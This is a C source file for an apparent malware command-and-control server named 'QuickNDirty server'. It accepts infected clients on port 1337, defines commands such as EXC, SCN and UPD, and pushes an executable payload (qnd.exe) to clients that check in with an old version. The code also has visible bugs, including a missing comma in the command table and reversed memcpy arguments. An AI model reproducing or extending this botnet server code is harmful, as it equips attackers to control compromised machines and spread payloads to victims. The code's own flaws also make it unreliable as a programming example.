/**
 * QuickNDirty server 0.1 strain A
 * Fuck Youston, June 09
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>

#include "qnds.h"
#include "sockutil.h"

/* Little lookup table so we can print commands from hex -> string. */
const char *cmdlookup[] = { "ERROR", "IAM", "BYE", "NOP", "PNG" 
                            "TDT", "BDT", "EXC", "MBX", 
                            "SCN", "UPD" };

const char *greeting = "you got pwnd guy";
const char *curver = "qnd0.1a.1\n";

static int push_update(int socket, const char *iamstr) {
    struct cmd_packet cmdpk;
    struct stat payloadinfo;
    int payloadhnd, bytesrd, bytesnt;
    void *payloadbuff;

    /* Check if there is a new version to push. */
    if(strcmp(curver, iamstr) == 0) {
        printf("client is current version\n");
        return 1;
    }

    /* Open the update, get its size, read it into a buffer etc.. */
    if((payloadhnd = open("qnd.exe", O_RDONLY)) == -1) {
        printf("no new update exe\n");
        return 1;
    }

    if(fstat(payloadhnd, &payloadinfo) == -1) {
        close(payloadhnd);
        printf("could not fstat update\n");
        return 1;
    }

    payloadbuff = malloc(payloadinfo.st_size);
    if((bytesrd = read(payloadhnd, payloadbuff, payloadinfo.st_size)) != payloadinfo.st_size) {
        close(payloadhnd);
        free(payloadbuff);
        printf("update read/fstat size mismatch %d/%ld\n", bytesrd, payloadinfo.st_size);
        return 1;
    }
   
    /* Ok got it, now sendall it to the client. */ 
    memset(&cmdpk, 0, sizeof(cmdpk));
    cmdpk.cmd = UPD;
    cmdpk.pload_size = payloadinfo.st_size;

    sendall(socket, &cmdpk, sizeof(cmdpk), 0);
    bytesnt = sendall(socket, payloadbuff, payloadinfo.st_size, 0);
    printf("update sent!, %d/%ld bytes\n", bytesnt, payloadinfo.st_size);

    close(payloadhnd);
    free(payloadbuff);
    return 0;
}

static int handle_client(int socket, struct sockaddr_in *clntdetails) {
    int conloop, rcode;
    struct cmd_packet cmdpk, cmdresp;
    void *databuff;
    char ipaddrstr[INET_ADDRSTRLEN];
    time_t curtime = time(NULL);

    /* Print connection message and details if possible. */
    if(inet_ntop(AF_INET, &clntdetails->sin_addr.s_addr, ipaddrstr, sizeof(ipaddrstr)) == NULL)
        memcpy("unknown", ipaddrstr, sizeof(ipaddrstr));
    printf("%snew client connection: %s\n", asctime(localtime(&curtime)), ipaddrstr);

    conloop = 1;
    while(conloop) {
        /* Well a new client has connected, lets see if they got anything
           interesting to say... */
        memset(&cmdpk, 0, sizeof(cmdpk));
        memset(&cmdresp, 0, sizeof(cmdresp));
        rcode = recvall(socket, (void*)&cmdpk, sizeof(cmdpk), 0);
        if(rcode == 0 || rcode == -1) {
            conloop = 0;
            printf("socket lost\n");
            break;
        }

        printf("cmd packet: 0x%x(%s), payload size: %d\n", cmdpk.cmd, cmdlookup[cmdpk.cmd], cmdpk.pload_size);
        switch(cmdpk.cmd) {  
            case IAM:
                /* Allocate enough space for the payload and grab it. */
                databuff = malloc(cmdpk.pload_size+1); /* +1 for NULL char if string. */
                memset(databuff, '\0', cmdpk.pload_size+1);
                recvall(socket, databuff, cmdpk.pload_size, 0);
                printf("payload: %s", (char*)databuff);

                /* TODO more shit, for now just tell the client to fuck off and hope it does. */
                push_update(socket, (char*)databuff);
            
            //    cmdresp.cmd = MBX;
            //    cmdresp.pload_size = strlen(greeting);
            //    sendall(socket, &cmdresp, sizeof(cmdresp), 0);
            //    sendall(socket, greeting, strlen(greeting), 0);

                cmdresp.cmd = BYE;
                cmdresp.pload_size = 0;
                sendall(socket, &cmdresp, sizeof(cmdresp), 0);
                printf("told client to fuck off\n");

                free(databuff);
                break;
            case ERR:
            default:
                printf("Unimplemented\n");
                break;
        }
    }
    close(socket);
    return 0;
}

int main(int argc, char *argv[]) {
    int srvrsock, clntsock, clen, pid, forkstatus;
    struct sockaddr_in condetails, clntdetails;

    memset(&condetails, 0, sizeof(condetails));
    condetails.sin_family = AF_INET;
    condetails.sin_addr.s_addr = htonl(INADDR_ANY);
    condetails.sin_port = htons(1337);
    clen = sizeof(clntdetails);

    if((srvrsock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("socket error\n");
        return 1;
    }

    if(bind(srvrsock, (struct sockaddr*)&condetails, sizeof(condetails)) < 0) {
        printf("bind error\n");
        return 1;
    }

    if(listen(srvrsock, 1) < 0) {
        printf("listen error\n");
        return 1;
    }

    /* Socket factory, loop and accept clients. */
    for(;;) {
        printf("listening...\n");

        if((clntsock = accept(srvrsock, (struct sockaddr*)&clntdetails, &clen)) < 0) 
            return 1;

        /* Spawn a child to handle the con and listen for some more.. */
        pid = fork();
        if(pid == 0) 
            return handle_client(clntsock, &clntdetails);
        /* Check if theres zombie procs to kill. FIX */
        else
            wait3(&forkstatus, WNOHANG, NULL);
    }
    close(srvrsock);
    return 0;
}
